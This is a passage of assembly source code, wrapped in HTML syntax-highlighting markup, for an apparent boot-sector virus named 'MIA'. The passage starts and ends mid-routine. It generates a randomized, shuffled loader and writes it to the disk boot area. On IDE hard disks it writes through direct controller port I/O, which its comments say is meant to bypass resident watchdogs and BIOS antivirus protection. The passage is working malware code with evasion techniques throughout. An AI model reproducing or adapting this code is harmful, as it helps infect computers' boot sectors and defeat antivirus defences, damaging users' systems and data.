 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Effervesce</span><span class="sc0">             </span><span class="sc1">; it's OK! so skip further checking</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7E00h</span><span class="sc0">               </span><span class="sc1">; Avoids overwriting boot-strap area</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Randomize</span><span class="sc0">              
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,-(</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Avoids overcrossing segment boundary, so</span><span class="sc0">
 </span><span class="sc6">jnbe</span><span class="sc0">   </span><span class="sc5">Randomize</span><span class="sc0">              </span><span class="sc1">; MIA can easily move all codes into memory   </span><span class="sc0">
                               </span><span class="sc1">; hole on booting.</span><span class="sc0">
</span><span class="sc5">Effervesce</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Save read buffer in DX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc0">                </span><span class="sc1">; MOV CX,XXXX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_1</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Track/sector of MIA's main body, 8-)</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc0">                </span><span class="sc1">; MOV DX,XXXX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Head (side) &amp; boot drive</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BCh</span><span class="sc0">                </span><span class="sc1">; MOV SP,XXXX</span><span class="sc0">
 </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">Solicit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">                 </span><span class="sc1">; Get random word for SP</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">                </span><span class="sc1">; Make it even value (avoid AC fault??)</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0600h</span><span class="sc0">               </span><span class="sc1">; 0000h:0600h is the lowest address MIA will</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Solicit</span><span class="sc0">                </span><span class="sc1">; use</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7C00h</span><span class="sc0">               </span><span class="sc1">; Be careful not to overwrite boot-strap area</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Salvaged</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7F00h</span><span class="sc0">               </span><span class="sc1">; Assume MIA needs 256 bytes of stack space</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Solicit</span><span class="sc0">                

</span><span class="sc5">Salvaged</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Mechanized</span><span class="sc0">             </span><span class="sc1">; it's OK If initial stack is below or same</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">Loader</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">   
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Solicit</span><span class="sc0">                </span><span class="sc1">; SP can only be set at least 256 bytes beyond</span><span class="sc0">

</span><span class="sc5">Mechanized</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; read buffer area</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">Shuffle</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0005h</span><span class="sc0">               </span><span class="sc1">; Five rows to shuffle</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; BX = first exchange pointer</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">
 </span><span class="sc6">imul</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; SI = second exchange pointer</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Exchange orders</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; This is nothing if BX = SI</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Shuffle</span><span class="sc0">                </span><span class="sc1">; Keep shuffling...</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">13CDh</span><span class="sc0">               </span><span class="sc1">; INT 13h opcode</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">11BFh</span><span class="sc0">               </span><span class="sc1">; JC $ + 04h</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Rand16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E3FFh</span><span class="sc0">              </span><span class="sc1">; JMP BX</span><span class="sc0">
 </span><span class="sc6">jnp</span><span class="sc0">    </span><span class="sc5">Scurry</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C353h</span><span class="sc0">              </span><span class="sc1">; PUSH BX + RETN</span><span class="sc0">

</span><span class="sc5">Scurry</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">18CDh</span><span class="sc0">               </span><span class="sc1">; INT 18h opcode</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Slack</span><span class="sc0">        </span><span class="sc1">; now, write it to boot area</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_3</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get drive number from stack</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Value_4</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Write to hard disk?</span><span class="sc0">
 </span><span class="sc6">js</span><span class="sc0">     </span><span class="sc5">Direct_Disk</span><span class="sc0">            </span><span class="sc1">; If yes, test if it's an IDE</span><span class="sc0">

</span><span class="sc5">Transmit</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Indirect</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Direct IDE hard disk access (write) ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Direct_Disk</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Check whether it's IDE (or MFM too??) disk</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">         </span><span class="sc1">; or not?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; Note that MIA doesn't check drive type since</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; many HDs are removable and being reported as</span><span class="sc0">
                               </span><span class="sc1">; floppies</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0104h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get 1st fixed disk parameter vector</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">                    
 </span><span class="sc5">setalc</span><span class="sc0">                        </span><span class="sc1">; SETALC opcode, AL=+1 if no carry, else AL=-1</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">              
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Inactive</span><span class="sc0">               </span><span class="sc1">; "Drive activity failed" (why?)</span><span class="sc0">
 </span><span class="sc6">lodsw</span><span class="sc0">                         </span><span class="sc1">; AX = number of cylinder</span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                 </span><span class="sc1">; Shift 6 bits lower, divide by 64 &amp; round down</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">                </span><span class="sc1">; Get bit 6-7 </span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; Shift 4 bits lower, divide by 16 &amp; round down</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                  </span><span class="sc1">; Now CX holds total cylinders</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; Two cylinders??</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; Now ZF set for IDEs </span><span class="sc0">

</span><span class="sc5">Inactive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Transmit</span><span class="sc0">                </span><span class="sc1">; IDE disk?</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Write to IDE hard disk, this is done by  performing direct access  via port</span><span class="sc0">
</span><span class="sc1">; of hard disk controller in order to bypass some TSR watchdogs and BIOS Anti</span><span class="sc0">
</span><span class="sc1">; Virus features. MIA uses the following ports:</span><span class="sc0">
</span><span class="sc1">;  Port 01F1h : Read  = anticipating errors</span><span class="sc0">
</span><span class="sc1">;               Write = Write Precompensation Cylinder div 4 (WPC/4)</span><span class="sc0">
</span><span class="sc1">;  Port 01F2h : Write = sector count</span><span class="sc0">
</span><span class="sc1">;  Port 01F3h : Write = sector number (CHR mode, instead of LBA)</span><span class="sc0">
</span><span class="sc1">;  Port 01F4h : Write = track (low) number (CHR mode, instead of LBA)</span><span class="sc0">
</span><span class="sc1">;  Port 01F5h : Write = track (high) number (CHR mode, instead of LBA)</span><span class="sc0">
</span><span class="sc1">;  Port 01F6h : Write = drive &amp; head (side)</span><span class="sc0">
</span><span class="sc1">;  Port 01F7h : Read  = drive status register</span><span class="sc0">
</span><span class="sc1">;               Write = command register</span><span class="sc0">
</span><span class="sc1">;  Port 03F6h : Write = Hard Disk Controller (HDC) data register</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">            
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">                </span><span class="sc1">; Clear all bits except bit 6-7 in CL</span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                 </span><span class="sc1">; Convert it to bit 0-1</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Low_Cylinder</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                  </span><span class="sc1">; Get head number </span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">                </span><span class="sc1">; Clear all bits but keep bit 6-7 (for HD with </span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; &gt;1024 cylinders), shift 4 bits lower, divide</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                  </span><span class="sc1">; by 16 &amp; round down</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Hi_Cylinder</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Get low-6-bit number of sector/record</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Beg_Sector</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">                </span><span class="sc1">; Fixed! bit 5 &amp; bit 7 must be set</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Drive_Head_01</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Drive_Head_02</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">                  </span><span class="sc1">; Spend some time</span><span class="sc0">

</span><span class="sc5">Endeavour</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; Option: enable disk initialization &amp; reset</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03F6h</span><span class="sc0">               </span><span class="sc1">; First HDC </span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Enable disk reset</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Port 01F6h :</span><span class="sc0">

</span><span class="sc5">Drive_Head_01</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Sending drive &amp; head (side) ...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Port 01F7h :</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Recalibrate...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Controller</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc0">                </span><span class="sc1">; Port 01F1h :</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">                 </span><span class="sc1">; Clear two reserved bits (bit-3 &amp; bit-5)</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Endeavour</span><span class="sc0">              </span><span class="sc1">; if not zero, then at least one error occured</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Controller</span><span class="sc0">        

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0F2h</span><span class="sc0">                </span><span class="sc1">; Port 01F2h :</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Sending number of sectors to write...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">

</span><span class="sc5">Beg_Sector</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Port 01F3h :</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Sending sector number...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">

</span><span class="sc5">Hi_Cylinder</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Port 01F4h :</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Sending hi-cylinder...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">

</span><span class="sc5">Low_Cylinder</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Port 01F5h :</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Sending low-cylinder...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">

</span><span class="sc5">Drive_Head_02</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Port 01F6h :</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Sending drive &amp; head (side) ...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Delay</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">                 </span><span class="sc1">; Perform write without retry.</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; Port 01F7h :</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Sending command... </span><span class="sc0">

</span><span class="sc5">Rolling_Drive</span><span class="sc4">:</span><span class="sc0">
